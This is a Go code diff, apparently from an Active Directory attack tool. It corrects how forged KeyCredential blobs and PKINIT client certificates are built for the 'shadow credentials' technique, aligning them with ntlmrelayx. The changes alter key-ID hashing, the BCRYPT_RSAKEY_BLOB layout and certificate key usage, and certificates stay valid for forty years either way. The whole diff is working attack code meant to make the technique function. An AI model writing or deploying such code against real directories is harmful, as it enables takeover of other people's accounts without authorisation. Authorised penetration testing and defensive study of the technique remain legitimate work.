@@ -43,13 +43,14 @@ func NewKeyCredential() (*KeyCredential, error) {
 		deviceID:   deviceID,
 	}
 
-	// Compute KeyID (SHA256 of public key)
-	pubKeyBytes, err := x509.MarshalPKIXPublicKey(kc.publicKey)
+	// Build BCRYPT_RSAKEY_BLOB first
+	rsaKeyBlob, err := kc.buildRSAKeyBlob()
 	if err != nil {
-		return nil, fmt.Errorf("failed to marshal public key: %w", err)
+		return nil, fmt.Errorf("failed to build RSA key blob: %w", err)
 	}
 
-	hash := sha256.Sum256(pubKeyBytes)
+	// Compute KeyID as SHA256 of the BCRYPT_RSAKEY_BLOB (matches ntlmrelayx)
+	hash := sha256.Sum256(rsaKeyBlob)
 	kc.keyID = hash[:]
 
 	return kc, nil
@@ -63,9 +64,9 @@ func (kc *KeyCredential) BuildKeyCredentialBlob() ([]byte, error) {
 		return nil, err
 	}
 
-	// Compute KeyHash (SHA256 of all properties before KeyHash itself)
-	properties := []property{
-		{Type: 0x01, Value: kc.keyID},
+	// Properties for hash calculation (WITHOUT KeyIdentifier)
+	// This matches ntlmrelayx: only properties 0x3-0x9 are hashed
+	propertiesForHash := []property{
 		{Type: 0x03, Value: rawKeyMaterial},
 		{Type: 0x04, Value: []byte{0x01}},
 		{Type: 0x05, Value: []byte{0x00}},
@@ -75,8 +76,9 @@ func (kc *KeyCredential) BuildKeyCredentialBlob() ([]byte, error) {
 		{Type: 0x09, Value: fileTimeNow()},      // CreationTime
 	}
 
-	keyHash := kc.calculateKeyHash(properties)
+	keyHash := kc.calculateKeyHash(propertiesForHash)
 
+	// All properties for final output (KeyIdentifier + KeyHash + rest)
 	allProperties := []property{
 		{Type: 0x01, Value: kc.keyID},
 		{Type: 0x02, Value: keyHash},
@@ -119,22 +121,21 @@ func (p *property) Marshal() []byte {
 func (kc *KeyCredential) buildRSAKeyBlob() ([]byte, error) {
 	pubKey := kc.publicKey
 
-	expBytes := pubKey.E
-	expBuf := make([]byte, 4)
-	binary.BigEndian.PutUint32(expBuf, uint32(expBytes))
-	for len(expBuf) > 1 && expBuf[0] == 0 {
-		expBuf = expBuf[1:]
-	}
+	// Convert exponent to bytes (big-endian, minimal representation like Python's long_to_bytes)
+	expBigInt := big.NewInt(int64(pubKey.E))
+	expBuf := expBigInt.Bytes()
 
+	// Convert modulus to bytes (big-endian, like Python's long_to_bytes)
 	modBytes := pubKey.N.Bytes()
 
+	// BCRYPT_RSAKEY_BLOB header
 	blob := make([]byte, 24)
-	binary.LittleEndian.PutUint32(blob[0:4], 0x31415352)
-	binary.LittleEndian.PutUint32(blob[4:8], 2048)
-	binary.LittleEndian.PutUint32(blob[8:12], uint32(len(expBuf)))
-	binary.LittleEndian.PutUint32(blob[12:16], uint32(len(modBytes)))
-	binary.LittleEndian.PutUint32(blob[16:20], 0)
-	binary.LittleEndian.PutUint32(blob[20:24], 0)
+	binary.LittleEndian.PutUint32(blob[0:4], 0x31415352)              // Magic: "RSA1"
+	binary.LittleEndian.PutUint32(blob[4:8], 2048)                    // BitLength (key size in bits)
+	binary.LittleEndian.PutUint32(blob[8:12], uint32(len(expBuf)))    // cbPublicExp
+	binary.LittleEndian.PutUint32(blob[12:16], uint32(len(modBytes))) // cbModulus
+	binary.LittleEndian.PutUint32(blob[16:20], 0)                     // cbPrime1 (not used for public key)
+	binary.LittleEndian.PutUint32(blob[20:24], 0)                     // cbPrime2 (not used for public key)
 
 	blob = append(blob, expBuf...)
 	blob = append(blob, modBytes...)
@@ -205,7 +206,7 @@ func (kc *KeyCredential) GenerateCertificate(username string, domain string) (*x
 		},
 		NotBefore:   time.Now().Add(-40 * 365 * 24 * time.Hour), // Valid from 40 years ago
 		NotAfter:    time.Now().Add(40 * 365 * 24 * time.Hour),  // Valid for 40 years
-		KeyUsage:    x509.KeyUsageCertSign,                      // CertSign for shadow credentials
+		KeyUsage:    x509.KeyUsageDigitalSignature,              // DigitalSignature for PKINIT client auth
 		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
 		ExtraExtensions: []pkix.Extension{
 			{
